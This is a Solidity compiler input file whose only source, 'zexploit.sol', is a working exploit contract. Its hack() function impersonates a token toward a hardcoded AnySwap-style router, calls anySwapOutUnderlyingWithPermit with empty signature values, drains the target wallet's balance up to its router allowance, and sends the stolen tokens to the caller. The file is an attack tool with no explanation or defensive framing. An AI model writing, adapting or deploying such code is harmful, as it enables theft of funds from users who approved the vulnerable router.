{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "contracts/zexploit.sol": {
      "content": "//SPDX-License-Identifier: UNLICENSED\r\npragma solidity ^0.8.10;\r\n\r\ninterface IERC20 {\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function permit(address target) external;\r\n}\r\n\r\ninterface IAnySwap {\r\n    function anySwapOutUnderlyingWithPermit(\r\n        address from,\r\n        address token,\r\n        address to,\r\n        uint amount,\r\n        uint deadline,\r\n        uint8 v,\r\n        bytes32 r,\r\n        bytes32 s,\r\n        uint toChainID\r\n    ) external;\r\n}\r\n\r\ncontract Exploit {\r\n    address constant router = address(0x6b7a87899490EcE95443e979cA9485CBE7E71522);\r\n    address immutable owner;\r\n    address internal _underlying;\r\n    constructor() {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function underlying() external returns(address) {\r\n        return _underlying;\r\n    }\r\n    \r\n    function depositVault(uint amount, address to) external returns (uint) {\r\n        return uint(1);\r\n    }\r\n\r\n    function burn(address from, uint256 amount) external returns (bool) {\r\n        return true;\r\n    }\r\n\r\n    function permit(address target, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {\r\n        \r\n    }\r\n\r\n    function hack(address targetToken, address target) external {\r\n        require(owner == tx.origin,'');\r\n        _underlying = targetToken;\r\n\r\n        uint256 allowance = IERC20(_underlying).allowance(target, router);\r\n        uint256 balance = IERC20(_underlying).balanceOf(target);\r\n        uint256 toDrain = (balance > allowance) ? allowance : balance;\r\n\r\n        IAnySwap(router).anySwapOutUnderlyingWithPermit(\r\n            target,\r\n            address(this),\r\n            tx.origin,\r\n            toDrain,\r\n            100000000000000000000,\r\n            0,\r\n            0x0000000000000000000000000000000000000000000000000000000000000000,\r\n            0x0000000000000000000000000000000000000000000000000000000000000000,\r\n            56\r\n        );\r\n        uint256 balanceContract = IERC20(_underlying).balanceOf(address(this));\r\n        if(balanceContract > 0) {\r\n            IERC20(_underlying).transfer(tx.origin, balanceContract);\r\n        }\r\n        _underlying = address(0x0);\r\n    }\r\n\r\n    fallback() external {\r\n\r\n    }\r\n}"
    }
  }
}